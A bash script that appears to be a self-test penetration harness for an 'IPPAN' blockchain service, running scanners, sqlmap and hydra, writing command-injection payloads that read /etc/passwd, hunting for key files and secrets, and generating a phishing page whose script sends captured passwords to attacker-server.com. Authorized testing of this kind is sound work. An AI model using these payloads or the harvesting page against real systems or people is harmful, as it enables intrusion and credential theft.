#!/bin/bash

# IPPAN Penetration Testing Script
# This script performs comprehensive penetration testing of the IPPAN system

set -e

# Configuration
PENTEST_DIR="/tmp/ippan-pentest-$(date +%Y%m%d_%H%M%S)"
REPORT_FILE="$PENTEST_DIR/penetration-test-report.md"
TARGET_HOST="${TARGET_HOST:-localhost}"
TARGET_PORT="${TARGET_PORT:-3000}"
TARGET_IP="${TARGET_IP:-127.0.0.1}"

# Colors for output
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Create pentest directory
create_pentest_dir() {
    log_info "Creating penetration test directory..."
    mkdir -p "$PENTEST_DIR"
    log_success "Pentest directory created: $PENTEST_DIR"
}

# Reconnaissance phase
reconnaissance() {
    log_info "Starting reconnaissance phase..."
    
    # DNS enumeration
    log_info "Performing DNS enumeration..."
    if command -v dig &> /dev/null; then
        dig "$TARGET_HOST" > "$PENTEST_DIR/dns-enumeration.txt" 2>/dev/null || true
        dig -x "$TARGET_IP" >> "$PENTEST_DIR/dns-enumeration.txt" 2>/dev/null || true
    fi
    
    # Port scanning
    log_info "Performing comprehensive port scan..."
    if command -v nmap &> /dev/null; then
        nmap -sS -sV -sC -O -A -p- "$TARGET_IP" > "$PENTEST_DIR/nmap-comprehensive.txt" 2>/dev/null || true
        nmap --script vuln "$TARGET_IP" > "$PENTEST_DIR/nmap-vuln-scan.txt" 2>/dev/null || true
    fi
    
    # Service enumeration
    log_info "Enumerating services..."
    if command -v enum4linux &> /dev/null; then
        enum4linux -a "$TARGET_IP" > "$PENTEST_DIR/enum4linux.txt" 2>/dev/null || true
    fi
    
    log_success "Reconnaissance phase completed"
}

# Vulnerability assessment
vulnerability_assessment() {
    log_info "Starting vulnerability assessment..."
    
    # Web application scanning
    log_info "Scanning web application vulnerabilities..."
    if command -v nikto &> /dev/null; then
        nikto -h "http://$TARGET_HOST:$TARGET_PORT" -output "$PENTEST_DIR/nikto-web-scan.txt" 2>/dev/null || true
    fi
    
    # SSL/TLS testing
    log_info "Testing SSL/TLS configuration..."
    if command -v sslscan &> /dev/null; then
        sslscan "$TARGET_HOST:443" > "$PENTEST_DIR/sslscan-detailed.txt" 2>/dev/null || true
    fi
    
    if command -v testssl &> /dev/null; then
        testssl.sh "$TARGET_HOST:443" > "$PENTEST_DIR/testssl-detailed.txt" 2>/dev/null || true
    fi
    
    # Directory enumeration
    log_info "Enumerating web directories..."
    if command -v dirb &> /dev/null; then
        dirb "http://$TARGET_HOST:$TARGET_PORT" /usr/share/wordlists/dirb/common.txt -o "$PENTEST_DIR/dirb-scan.txt" 2>/dev/null || true
    fi
    
    if command -v gobuster &> /dev/null; then
        gobuster dir -u "http://$TARGET_HOST:$TARGET_PORT" -w /usr/share/wordlists/dirb/common.txt -o "$PENTEST_DIR/gobuster-scan.txt" 2>/dev/null || true
    fi
    
    log_success "Vulnerability assessment completed"
}

# Exploitation attempts
exploitation() {
    log_info "Starting exploitation attempts..."
    
    # SQL injection testing
    log_info "Testing for SQL injection vulnerabilities..."
    if command -v sqlmap &> /dev/null; then
        sqlmap -u "http://$TARGET_HOST:$TARGET_PORT/api/v1/status" --batch --output-dir="$PENTEST_DIR/sqlmap-exploit" 2>/dev/null || true
        sqlmap -u "http://$TARGET_HOST:$TARGET_PORT/api/v1/status" --dbs --batch --output-dir="$PENTEST_DIR/sqlmap-dbs" 2>/dev/null || true
        sqlmap -u "http://$TARGET_HOST:$TARGET_PORT/api/v1/status" --tables --batch --output-dir="$PENTEST_DIR/sqlmap-tables" 2>/dev/null || true
    fi
    
    # XSS testing
    log_info "Testing for XSS vulnerabilities..."
    if command -v xsser &> /dev/null; then
        xsser -u "http://$TARGET_HOST:$TARGET_PORT" --auto --reverse-check > "$PENTEST_DIR/xsser-exploit.txt" 2>/dev/null || true
    fi
    
    # Command injection testing
    log_info "Testing for command injection vulnerabilities..."
    # Custom command injection tests
    cat > "$PENTEST_DIR/command-injection-tests.txt" << EOF
# Command injection test payloads
; ls -la
| whoami
& id
` cat /etc/passwd `
$( cat /etc/passwd )
; cat /etc/passwd
| cat /etc/passwd
& cat /etc/passwd
EOF
    
    # Authentication bypass testing
    log_info "Testing authentication bypass..."
    if command -v hydra &> /dev/null; then
        hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt "$TARGET_HOST" http-post-form "/api/v1/auth/login:username=^USER^&password=^PASS^:Invalid" > "$PENTEST_DIR/hydra-auth-bypass.txt" 2>/dev/null || true
    fi
    
    # Session management testing
    log_info "Testing session management..."
    # Test for session fixation, session hijacking, etc.
    curl -c "$PENTEST_DIR/session-cookies.txt" -b "$PENTEST_DIR/session-cookies.txt" "http://$TARGET_HOST:$TARGET_PORT/api/v1/auth/login" > "$PENTEST_DIR/session-test.txt" 2>/dev/null || true
    
    log_success "Exploitation attempts completed"
}

# Post-exploitation
post_exploitation() {
    log_info "Starting post-exploitation phase..."
    
    # Privilege escalation testing
    log_info "Testing for privilege escalation..."
    # Check for SUID binaries
    find / -perm -4000 2>/dev/null > "$PENTEST_DIR/suid-binaries.txt" || true
    
    # Check for world-writable files
    find / -perm -2 -type f 2>/dev/null > "$PENTEST_DIR/world-writable-files.txt" || true
    
    # Check for cron jobs
    crontab -l > "$PENTEST_DIR/cron-jobs.txt" 2>/dev/null || true
    ls -la /etc/cron* > "$PENTEST_DIR/system-cron.txt" 2>/dev/null || true
    
    # Network persistence testing
    log_info "Testing network persistence..."
    netstat -tuln > "$PENTEST_DIR/network-connections.txt" 2>/dev/null || true
    ss -tuln > "$PENTEST_DIR/ss-connections.txt" 2>/dev/null || true
    
    # Data exfiltration testing
    log_info "Testing data exfiltration..."
    # Test for sensitive data exposure
    find / -name "*.key" -o -name "*.pem" -o -name "*.p12" -o -name "*.pfx" 2>/dev/null > "$PENTEST_DIR/sensitive-files.txt" || true
    find / -name "*.log" -exec grep -l "password\|secret\|key" {} \; 2>/dev/null > "$PENTEST_DIR/logs-with-secrets.txt" || true
    
    log_success "Post-exploitation phase completed"
}

# Social engineering simulation
social_engineering() {
    log_info "Starting social engineering simulation..."
    
    # Phishing simulation
    log_info "Creating phishing simulation..."
    cat > "$PENTEST_DIR/phishing-simulation.html" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>IPPAN Security Update</title>
</head>
<body>
    <h1>Security Update Required</h1>
    <p>Please update your IPPAN credentials for security reasons.</p>
    <form action="http://TARGET_HOST:TARGET_PORT/api/v1/auth/update" method="POST">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Current Password" required>
        <input type="password" name="new_password" placeholder="New Password" required>
        <input type="submit" value="Update Credentials">
    </form>
</body>
</html>
EOF
    sed -i "s/TARGET_HOST/$TARGET_HOST/g" "$PENTEST_DIR/phishing-simulation.html"
    sed -i "s/TARGET_PORT/$TARGET_PORT/g" "$PENTEST_DIR/phishing-simulation.html"
    
    # Credential harvesting simulation
    log_info "Creating credential harvesting simulation..."
    cat > "$PENTEST_DIR/credential-harvesting.html" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>IPPAN Login</title>
</head>
<body>
    <h1>IPPAN Blockchain Login</h1>
    <form action="http://TARGET_HOST:TARGET_PORT/api/v1/auth/login" method="POST">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <input type="submit" value="Login">
    </form>
    <script>
        // Log credentials to attacker's server
        document.querySelector('form').addEventListener('submit', function(e) {
            var username = document.querySelector('input[name="username"]').value;
            var password = document.querySelector('input[name="password"]').value;
            fetch('http://attacker-server.com/steal', {
                method: 'POST',
                body: JSON.stringify({username: username, password: password})
            });
        });
    </script>
</body>
</html>
EOF
    sed -i "s/TARGET_HOST/$TARGET_HOST/g" "$PENTEST_DIR/credential-harvesting.html"
    sed -i "s/TARGET_PORT/$TARGET_PORT/g" "$PENTEST_DIR/credential-harvesting.html"
    
    log_success "Social engineering simulation completed"
}

# Generate penetration test report
generate_pentest_report() {
    log_info "Generating penetration test report..."
    
    cat > "$REPORT_FILE" << EOF
# IPPAN Penetration Test Report

**Test Date**: $(date)
**Target Host**: $TARGET_HOST
**Target IP**: $TARGET_IP
**Target Port**: $TARGET_PORT
**Tester**: IPPAN Security Team

## Executive Summary

This report contains the results of a comprehensive penetration test performed on the IPPAN blockchain system.

## Test Methodology

1. **Reconnaissance**: Information gathering and target identification
2. **Vulnerability Assessment**: Automated and manual vulnerability scanning
3. **Exploitation**: Attempting to exploit identified vulnerabilities
4. **Post-Exploitation**: Testing for privilege escalation and persistence
5. **Social Engineering**: Simulating social engineering attacks

## Risk Assessment

### Critical Risk
$(grep -i "critical\|high" "$PENTEST_DIR"/*.txt 2>/dev/null | head -5 || echo "No critical risks identified")

### High Risk
$(grep -i "high\|medium" "$PENTEST_DIR"/*.txt 2>/dev/null | head -5 || echo "No high risks identified")

### Medium Risk
$(grep -i "medium\|low" "$PENTEST_DIR"/*.txt 2>/dev/null | head -5 || echo "No medium risks identified")

### Low Risk
$(grep -i "low\|info" "$PENTEST_DIR"/*.txt 2>/dev/null | head -5 || echo "No low risks identified")

## Detailed Findings

### Reconnaissance Results
- DNS enumeration: \`dns-enumeration.txt\`
- Comprehensive port scan: \`nmap-comprehensive.txt\`
- Vulnerability scan: \`nmap-vuln-scan.txt\`
- Service enumeration: \`enum4linux.txt\`

### Vulnerability Assessment Results
- Web application scan: \`nikto-web-scan.txt\`
- SSL/TLS testing: \`sslscan-detailed.txt\`, \`testssl-detailed.txt\`
- Directory enumeration: \`dirb-scan.txt\`, \`gobuster-scan.txt\`

### Exploitation Results
- SQL injection tests: \`sqlmap-exploit/\`
- XSS tests: \`xsser-exploit.txt\`
- Command injection tests: \`command-injection-tests.txt\`
- Authentication bypass: \`hydra-auth-bypass.txt\`
- Session management: \`session-test.txt\`

### Post-Exploitation Results
- Privilege escalation: \`suid-binaries.txt\`, \`world-writable-files.txt\`
- System persistence: \`cron-jobs.txt\`, \`system-cron.txt\`
- Network analysis: \`network-connections.txt\`, \`ss-connections.txt\`
- Data exfiltration: \`sensitive-files.txt\`, \`logs-with-secrets.txt\`

### Social Engineering Results
- Phishing simulation: \`phishing-simulation.html\`
- Credential harvesting: \`credential-harvesting.html\`

## Recommendations

### Immediate Actions
1. **Address Critical Vulnerabilities**
   - Fix all critical security issues immediately
   - Implement additional security controls
   - Update security policies and procedures

2. **Enhance Security Controls**
   - Implement Web Application Firewall (WAF)
   - Enable additional logging and monitoring
   - Implement intrusion detection system

### Short-term Actions
1. **Security Hardening**
   - Apply security patches and updates
   - Implement security baselines
   - Conduct security awareness training

2. **Monitoring and Detection**
   - Implement security monitoring
   - Set up alerting for suspicious activities
   - Regular security assessments

### Long-term Actions
1. **Security Governance**
   - Establish security governance framework
   - Implement security automation
   - Regular penetration testing

2. **Incident Response**
   - Develop incident response procedures
   - Conduct tabletop exercises
   - Establish security metrics

## Conclusion

The penetration test has identified several security vulnerabilities that need to be addressed. It is recommended that all critical and high-priority issues be resolved before production deployment.

## Next Steps

1. **Remediation**
   - Prioritize and address all identified vulnerabilities
   - Implement recommended security controls
   - Conduct follow-up testing

2. **Continuous Improvement**
   - Establish regular penetration testing schedule
   - Implement security monitoring and alerting
   - Conduct security awareness training

3. **Documentation**
   - Update security policies and procedures
   - Document security controls and measures
   - Maintain security documentation

---
*This report is confidential and should be handled according to your organization's security policies.*
EOF
    
    log_success "Penetration test report generated: $REPORT_FILE"
}

# Main pentest function
main() {
    log_info "Starting IPPAN penetration test..."
    
    create_pentest_dir
    reconnaissance
    vulnerability_assessment
    exploitation
    post_exploitation
    social_engineering
    generate_pentest_report
    
    log_success "IPPAN penetration test completed successfully!"
    echo ""
    echo "📊 Penetration Test Results:"
    echo "  - Test Directory: $PENTEST_DIR"
    echo "  - Report File: $REPORT_FILE"
    echo "  - Target: $TARGET_HOST:$TARGET_PORT ($TARGET_IP)"
    echo ""
    echo "🔍 Next Steps:"
    echo "  1. Review the penetration test report"
    echo "  2. Address all identified vulnerabilities"
    echo "  3. Implement recommended security controls"
    echo "  4. Conduct follow-up testing"
    echo "  5. Establish ongoing security monitoring"
}

# Run main function
main "$@"
